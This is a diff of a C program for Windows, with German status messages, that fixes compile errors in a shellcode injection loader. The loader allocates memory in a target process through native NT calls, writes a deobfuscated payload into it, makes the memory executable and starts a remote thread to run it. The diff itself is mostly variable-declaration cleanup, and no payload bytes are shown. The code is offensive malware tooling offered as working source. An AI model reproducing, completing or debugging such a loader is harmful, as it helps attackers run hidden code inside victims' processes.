@@ -1,6 +1,8 @@
+#define WIN32_NO_STATUS
 #include <stdio.h>
 #include <windows.h>
 #include <winternl.h>
+#include <ntstatus.h>
 #include <bcrypt.h>
 
 #define NT_SUCCESS(status)              (((NTSTATUS)(status)) >= 0)
@@ -267,7 +269,9 @@ int main() {
     printf("Druecke Enter um Speicher zu allokieren");
     getchar();
 
-    NTSTATUS status = NtAllocateVirtualMem(
+    NTSTATUS status;
+
+    status = NtAllocateVirtualMem(
         hProc,
         &base,
         0,
@@ -285,7 +289,7 @@ int main() {
     printf("Druecke Enter um in den Speicher zu schreiben");
     getchar();
 
-    NTSTATUS status = NtWriteVirtualMem(
+    status = NtWriteVirtualMem(
         hProc,
         base,
         pDeobfuscatedPayload,
@@ -301,8 +305,8 @@ int main() {
     printf("[+] Shellcode erfolgreich in den speicher geschrieben bei: ox%p\n", base);
     printf("[+] Berechtigungen des Speichers werden geändert\n");
 
-    ULONG dwOldProtection = NULL;
-    NTSTATUS status = NtProtectVirtualMem(
+    ULONG dwOldProtection = 0;
+    status = NtProtectVirtualMem(
         hProc,
         &base,
         &PageSize,
@@ -320,7 +324,7 @@ int main() {
 
     HANDLE hThread = NULL;
 
-    NTSTATUS status = NtCreateThread(
+    status = NtCreateThread(
         &hThread,
         THREAD_ALL_ACCESS,
         NULL,
@@ -338,5 +342,13 @@ int main() {
         printf("NtCreateThread Fehlgeschlagen: 0x%08X\n", status);
         return -1;
         }
+
+
+
+
+
+
+
+
 
 }
